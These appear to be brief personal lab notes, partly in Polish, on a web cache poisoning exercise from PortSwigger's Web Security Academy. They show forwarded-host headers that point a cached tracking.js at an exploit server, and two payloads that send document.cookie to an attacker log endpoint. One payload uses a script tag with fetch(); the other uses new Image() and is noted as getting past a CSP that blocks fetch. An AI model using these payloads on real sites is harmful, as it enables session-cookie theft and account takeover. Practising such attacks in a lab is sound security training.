Multiple headers
GET /resources/js/tracking.js
x-forwarded-scheme: nohttps
x-forwarded-host: exploitserver

<img width="1346" height="808" alt="image" src="https://github.com/user-attachments/assets/8ec209af-8724-4122-9c8e-0e9ee6eeb7cd" />



Fetch zadziała jeśli ciasteczko nie ma flagi HttpOnly
<script>fetch('https://exploit-xxxx.web-security-academy.net/log?c='+document.cookie)</script>

new Image() — klasyczny wektor, działa nawet jeśli CSP blokuje fetch/XHR ale nie blokuje img-src:
new Image().src='https://exploit-xxxx.web-security-academy.net/log?c='+document.cookie
